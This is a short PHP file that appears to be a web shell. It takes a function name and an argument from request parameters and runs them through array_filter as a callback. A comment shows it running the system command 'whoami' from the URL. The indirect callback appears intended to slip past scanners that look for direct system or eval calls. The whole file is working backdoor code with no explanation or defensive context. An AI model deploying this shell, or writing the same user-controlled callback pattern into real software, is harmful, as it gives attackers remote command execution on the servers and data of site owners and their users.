<?php 
//?func=system&a=whoami
$a=$_REQUEST['a'];
$array1=array($a);
$func =$_REQUEST['func'];
array_filter($array1,$func);
?>